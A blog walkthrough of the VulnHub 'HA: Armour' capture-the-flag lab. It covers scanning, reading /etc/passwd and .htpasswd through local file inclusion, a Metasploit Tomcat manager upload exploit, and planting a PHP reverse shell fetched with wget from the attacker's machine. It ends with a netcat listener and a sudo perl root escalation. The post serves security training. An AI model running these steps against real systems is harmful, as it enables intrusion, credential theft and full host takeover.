<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">HA: Armour Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ha-armour-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-10-06T05:59:02+00:00">October 6, 2019</time><time class="updated" datetime="2025-06-10T20:12:02+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is our Walkthrough for ‚ÄúHA: Armour‚Äù and this CTF is designed by Hacking Articles Team üòä, hope you will enjoy this.</span></p>
<p><span style="color: #000000;"><strong>TASK:</strong> Klaw has stolen some armours from the Avengers Super-Secret Base. Falcon has checked the manifest, the following things are unaccountable:</span></p>
<ul>
<li><span style="color: #000000;">HulkBuster Armour</span></li>
<li><span style="color: #000000;">Spiderman Armour</span></li>
<li><span style="color: #000000;">Ant-Man Armour</span></li>
<li><span style="color: #000000;">Black Panther Armour</span></li>
<li><span style="color: #000000;">Iron Man Armour</span></li>
</ul>
<p><span style="color: #000000;">Klaw hides all these armours and now it‚Äôs up to you. Can you use your penetration skills to recover them all?</span></p>
<p><span style="color: #000000;"><strong>Hint:</strong> <em>P.S. Klaw has a habit of dividing his passwords into 3 parts and save them at different locations. So, if you get some combine them to move forward.</em></span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Intermediate</span></p>
<p><span style="color: #000000;">You can download this lab from <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/ha-armour,370/">here</a></strong>.</span></p>
<p><span style="color: #000000;"><strong>Let‚Äôs Begin!!</strong></span></p>
<p><span style="color: #000000;"><strong>Penetration Testing Methodologies</strong></span></p>
<p><span style="color: #000000;"><strong>Scanning Network</strong></span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration </strong></span></p>
<ul>
<li><span style="color: #000000;">SSH</span></li>
<li><span style="color: #000000;">Abusing HTTP</span></li>
<li><span style="color: #000000;">Tftp</span></li>
<li><span style="color: #000000;">Dirb</span></li>
<li><span style="color: #000000;">LFI</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Abusing Tomcat Manager (Metasploit)</span></li>
<li><span style="color: #000000;">Internal Recon</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Abusingconf</span></li>
<li><span style="color: #000000;">Abusing sudo rights</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Scanning Network</strong></span></h3>
<p><span style="color: #000000;">Firsts of all try to identify our target and for this use the following command:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ParoDTyR6l8/XZl7fQF-9FI/AAAAAAAAgzE/ceuG1jp-QKIDpMrhQ-X3m4nWNHNxEhgJQCLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">After you have identified your target using the above command you can start with our second step by scanning the target. You can use nmap to scan the target using the following command:</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.101</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-QGNXDfjsepA/XZl7ie9Sl8I/AAAAAAAAgzw/Cxgf4cX2xBcJiHL71LaY5CaZ7oY7hyxygCLcBGAsYHQ/s1600/2.png"/></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">With the help of scanning, you can find that port numbers 80, 8009, 8080 for HTTP (apache http, apache Jserv &amp; apache tomcat) &amp; 65534 for SSH are opened.</span></p>
<p><span style="color: #000000;">You will find the first ‚ÄúHulkBuster‚Äù armour when connecting to SSH via port 65534 and the first hint: the Olympics as mentioned above for Klaw.</span></p>
<pre class="lang:default decode:true">ssh 192.168.1.101 -p65534</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-T8qPW7yJ74o/XZl7jxbWfmI/AAAAAAAAg0I/3xlIcTKhBUME14wkw6vrgXjC79KSRZ2pQCLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">After getting HulkBuster, it was time to dig out another Armor so you can connect to port 80 through a web browser.</span></p>
<p><span style="color: #000000;">Hmmmm! Well, the web page described the Armor Collection of Marvel‚Äôs famous characters; but you need to dig out more so that you can get a hint.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-HJQBS0FdmUc/XZl7k6RnhwI/AAAAAAAAg0U/0BMzrcfUCf43COHx2JrO6GEo-Dj2AM1MgCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">Ahh!! So, as you can see from the image given below that from inside the source code we found 3 things i.e. ‚Äúarmour, 69 and notes.txt‚Äù from inside the comment.</span></p>
<p><span style="color: #000000;">Let‚Äôs check each hint one-by-one and identify what it says.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-624nZDkAKFY/XZl7kvCv6PI/AAAAAAAAg0M/slOmEd3tHGMHHLFCzRoPAbfEvh_BipJaQCLcBGAsYHQ/s1600/5.png"/></p>
<p><span style="color: #000000;">Assuming 69 could be a hint for any port, therefore using nmap again to decide whether or not a service is running on port 69. Therefore, we scan for the UDP protocol and give the following command:</span></p>
<pre class="lang:default decode:true">nmap -sU -p69 192.168.1.101</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-AUhPPmGIbyk/XZl7k0h1fdI/AAAAAAAAg0Q/Q7cbzFrIYkgOpn89TMi0tU8oH3Azo29gQCLcBGAsYHQ/s1600/6.png"/></p>
<p><span style="color: #000000;">Now, once you know that port 69 is open for TFTP operation, you can try connecting to TFTP and check the list of available files and directories.</span></p>
<p><span style="color: #000000;">Here you find the notes.txt file, which was mentioned above, so you need to download this file to your local machine.</span></p>
<pre class="lang:default decode:true">tftp 192.168.1.101
get notes.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-AKZwF9fBa6w/XZl7lT6sJeI/AAAAAAAAg0Y/3OnPrcxj66Md9CnexbTHFkkbSWum3inpgCLcBGAsYHQ/s1600/7.png"/></p>
<p><span style="color: #000000;">From inside notes.txt file, you will get the second amour which is for ‚ÄúSpiderman‚Äù and 2<sup>nd</sup> Hint:<strong>maybeevena </strong>which was hidden by Klaw.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-zwUnDQmBHA0/XZl7mBrSqwI/AAAAAAAAg0c/MWFnALR6SJ8vzoxUzUz-3NOCZiPXkcjIwCLcBGAsYHQ/s1600/8.png"/></p>
<p><span style="color: #000000;">At present, you must be having two amours and two hints that we have found till now. To identify third amour or hint we are going to use dirb for brute-forcing web directory to enumerate all files with .php extension.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.101 -X .php</pre>
<p><span style="color: #000000;">With the of dirb, you may find a URL for <em>/file.php</em> page as shown in the below image.</span></p>
<pre class="lang:default decode:true">http://192.168.1.101/file.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-OPbgeHD0m54/XZl7mgfRAPI/AAAAAAAAg0g/FF3KDhqjrUkbX8GihCA9RisQWvfCEiBhACLcBGAsYHQ/s1600/9.png"/></p>
<p><span style="color: #000000;">But when you browse the /file.php page, you‚Äôll see a white colour page that‚Äôs left blank, and it‚Äôs seriously questioning why the author has left file.php blank.</span></p>
<p><span style="color: #000000;">And if you are aware of the Vulnerabilities web application and its Penetration Testing, then you would have known what kind of misconfiguration it is.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-mJ0Jg9_JMNc/XZl7fuVzVwI/AAAAAAAAgzI/vPKcyzOBBd0ADi__HwZyROqFZgJqe7yeACLcBGAsYHQ/s1600/10.png"/></p>
<p><span style="color: #000000;">In such a case, it is likely that the host system or application is vulnerable to LFI (Local File Inclusion).</span></p>
<p><span style="color: #000000;">So, without wasting your time, you can try to access /etc/passwd like we did here and say it‚Äôs vulnerable to LFI.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-sFbKhbc6LX4/XZl7fv36B2I/AAAAAAAAgzM/RwIa6ceqyQIGO7fUL0Q78BqB4NeBT__6gCLcBGAsYHQ/s1600/11.png"/></p>
<p><span style="color: #000000;">When you dig more and more than inside /etc/apache2/.htpasswd file you will find the third amour which for ‚ÄúAnt-Man‚Äù and along with this 3<sup>rd</sup> hint: <strong>StarBucks</strong>.</span></p>
<p><span style="color: #000000;">Now let‚Äôs recall the hint given by the author:</span></p>
<p><span style="color: #000000;"><em>P.S. Klaw has a habit of dividing his passwords into <strong>3 parts</strong> and save them at different locations. So, <strong>if you get some combine them to move forward.</strong></em></span></p>
<p><span style="color: #000000;">So, as you know that till now, we have found all 3 parts of the password as Hint1, Hint2 and Hint3; let‚Äôs combined them and identify how it will help to move ahead.</span></p>
<pre class="lang:default decode:true">http://192.168.1.101/file.php?file=/etc/apache2/.htpasswd</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-s_DPWzY2YQw/XZl7gcyMk3I/AAAAAAAAgzQ/5UEwcTqh6NQXpSFPQwyI8GOtHK4TAB14ACLcBGAsYHQ/s1600/12.png"/></p>
<p><span style="color: #000000;">After combining Hint1, Hint2 and Hint3 you will have a password:</span></p>
<pre class="lang:default decode:true  ">TheOlympicsmaybeevenaStarBucks</pre>
<p><span style="color: #000000;">As you know port 8080 is available for Apache tomcat manager and maybe can login into tomcat server with the help of this password.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-lAPLnc1vOD8/XZl7ghD_geI/AAAAAAAAgzU/Kym-qdwMejQzkek1J7yNJ2wWN7EfwiJTACLcBGAsYHQ/s1600/13.png"/></p>
<h3><span style="color: #800000;"><strong>Exploiting Tomcat Manager</strong></span></h3>
<p><span style="color: #000000;">For login into tomcat manager we use the following credential:</span></p>
<p><span style="color: #000000;"><strong>Username:</strong> Amour (found above from inside source code)</span></p>
<p><span style="color: #000000;"><strong>Password:</strong> TheOlympicsmaybeevenastarBucks</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-qJmSVEJQVKI/XZl7g2OLGTI/AAAAAAAAgzY/udO1Pq9WIwE19XOshO6vZk79ZsHZHatrgCLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;">I hope you all are aware of Tomcat manager exploit available in Metasploit framework, if not then read the complete article from <a style="color: #000000;" href="https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/">here</a>.</span></p>
<p><span style="color: #000000;">So, without wasting time we are straight away logged into Tomcat Server using Metasploit Tomcat Manager using the above credentials for Tomcat Server Login.</span></p>
<pre class="lang:default decode:true">use exploit/multi/http/tomcat_mgr_upload
set rhosts 192.168.1.101
set rport 8080
set httpusername armour
set httppassword TheOlympicsmaybeevenastarBucks
exploit</pre>
<p><span style="color: #000000;">Booom!! Our favourite meterpreter session is all here, let‚Äôs go for Post enumeration.</span></p>
<pre class="lang:default decode:true">netstat -antp</pre>
<p><span style="color: #000000;">If you check your local network static for TCP and UDP connections, you‚Äôll see that there‚Äôs something running 8081, and even nmap doesn‚Äôt display anything for this. With the aid of the meterpreter, we have forwarded service port 8081 to our local host:8081.</span><span style="color: #000000;"><strong>¬†</strong></span></p>
<pre class="lang:default decode:true">portfwd add -l 8081 -p 8081 -r 127.0.0.1</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-X_2-ld75QPY/XZl7hFc-HaI/AAAAAAAAgzc/SR1XaIaD1skWaOv1NJJeVWn13LQXkxg0wCLcBGAsYHQ/s1600/15.png"/></p>
<p><span style="color: #000000;">Once you have to forward the service over your local machine then you can explore it the web browser as we have done here.</span></p>
<pre class="lang:default decode:true">http://127.0.0.1:8081</pre>
<p><span style="color: #000000;">This will give you the fourth amour for ‚ÄúBlack-Panther‚Äù üòé</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-tXXDMad7MuU/XZl7hdqKmSI/AAAAAAAAgzg/Lh9bwyVUVeII7WNdNwofxOVqiAvisth-ACLcBGAsYHQ/s1600/16.png"/></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation </strong></span></h3>
<p><span style="color: #000000;">This lab is like a Rabbit hole where Enumeration is key for identifying loopholes or further hint. Similarly, we enumerate that /apache2.conf and /html owns writable permission.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-z34MCN58juc/XZl7hq9BviI/AAAAAAAAgzk/1iw9WMY-WVYlmFQR_SOzw8PMu2IamSSYQCLcBGAsYHQ/s1600/17.png"/></p>
<p><span style="color: #000000;">Since we know apache2.conf has all permission, therefore, we‚Äôll try to edit this file for the escalating privilege of another user.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-lWYvrShHRHI/XZl7h9U3rMI/AAAAAAAAgzo/Cpm8GtBzUw4RjgBgzkd_TGcBT4O0FegJwCLcBGAsYHQ/s1600/18.png"/></p>
<p><span style="color: #000000;">This machine has a user profile named as ‚Äúaarti‚Äù that we had enumerated through /etc/passwd and now try to add a <strong>user:aarti </strong>and <strong>group:aarti</strong> inside the /etc/apache2/apache2.conf so that we will leverage it for privilege escalation. So, the idea is when we restart the apache service it will get executed with aarti user privileges.</span></p>
<p><span style="color: #000000;">So, we have simple copied the entire content of the apache2.conf file in our local machine and made changes as said above.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Z-AldzrMDF8/XZl7iH1dSiI/AAAAAAAAgzs/6n43fG-Wn3Ylx1_BX28wzibhV1Pj1WgwQCLcBGAsYHQ/s1600/19.png"/></p>
<p><span style="color: #000000;">Then download the modified apache2.conf from your local machine into the host machine and replaced the original apache2.conf file as we have done here.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-5Yq8YD-GN-w/XZl7ijiISwI/AAAAAAAAgz0/I9eA4mFnodUJvHUZBJpuavrSg4hv5sCfACLcBGAsYHQ/s1600/20.png"/></p>
<p><span style="color: #000000;">As you know the /html has full permission which means inject the php backdoor in this web directory.¬† Parallelly we grabbed a php-reverse-shell from /usr/share/webshells/php and modified the listener IP as ours and named it as shell.php.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-6rpZVP5bcZU/XZl7i-IHFNI/AAAAAAAAgz4/Kd4nielmdysb5_K0lr7Y3PXj_6P0WMnwQCLcBGAsYHQ/s1600/21.png"/></p>
<p><span style="color: #000000;">Then downloaded the shell into /var/www/html folder so that we can access it through the browser.</span></p>
<p><span style="color: #000000;">To make the apache service run as aarti user we have to restart the apache service, thus reboot the machine.</span></p>
<pre class="lang:default decode:true">cd /var/www/html
wget http://192.168.1.102:8000/shell.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-X9TiAkpCFqg/XZl7jRm8WRI/AAAAAAAAgz8/9h9ZNe4sD9EmHAIYKhOXiZWwwfR7_IylgCLcBGAsYHQ/s1600/22.png"/></p>
<p><span style="color: #000000;">After reboot is complete, we just executed the shell.php script in the browser and at the same time started a netcat listener on your kali.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
http://192.168.1.101/shell.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-VXf7k6DQ7qg/XZl7jqsa-UI/AAAAAAAAg0E/LowBiUNzp44aOTt1ASqv8XffV1x7tIvAACLcBGAsYHQ/s1600/23.png"/></p>
<p><span style="color: #000000;">After some time, we got a reverse netcat shell on our local machine for user aarti. Now let‚Äôs check sudo rights for this user.</span></p>
<pre class="lang:default decode:true">sudo -l</pre>
<p><span style="color: #000000;">Here you can observe that it shows that user aarti has sudo right to run Perl application as root which means we can try to abuse its sudo for escalating root privilege.</span></p>
<pre class="lang:default decode:true">sudo perl -e 'exec "/bin/bash";'</pre>
<p><span style="color: #000000;">Boom!! We have the root shell access, let‚Äôs find the fifth and final amour. You can find it inside the /root directory within final.txt.</span></p>
<pre class="lang:default decode:true">cd /root
cat final.txt</pre>
<p><span style="color: #000000;">And the final amour is my favourite ‚ÄúIron-man‚Äù ü§ó</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-GLN_T88uqbQ/XZl7jmlVSCI/AAAAAAAAg0A/2cfcNJBQy8IiAaZwmDt4ccNg2j74WhzdwCLcBGAsYHQ/s1600/24.png"/></p>
<p><span style="color: #000000;"><strong>Author</strong>: Kavish Tyagi is a Cybersecurity enthusiast and Researcher in the field of WebApp Penetration testing. Contact</span> <a href="https://www.linkedin.com/in/kavish-tyagi-844239125/"><strong>here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
